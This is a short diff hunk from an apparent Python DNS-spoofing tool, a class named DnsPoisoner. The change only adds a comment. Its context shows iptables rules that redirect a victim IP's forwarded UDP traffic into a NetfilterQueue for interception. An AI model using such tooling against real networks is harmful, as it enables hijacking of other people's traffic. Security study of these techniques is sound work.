@@ -10,7 +10,7 @@ class DnsPoisoner(multiprocessing.Process):
         multiprocessing.Process.__init__(self)
 
         self.urls_to_spoof = {}
-        self.queue         = NetfilterQueue()
+        self.queue         = NetfilterQueue()    #Library capable of handling IP packets
         self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
         self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
         self.exit          = False
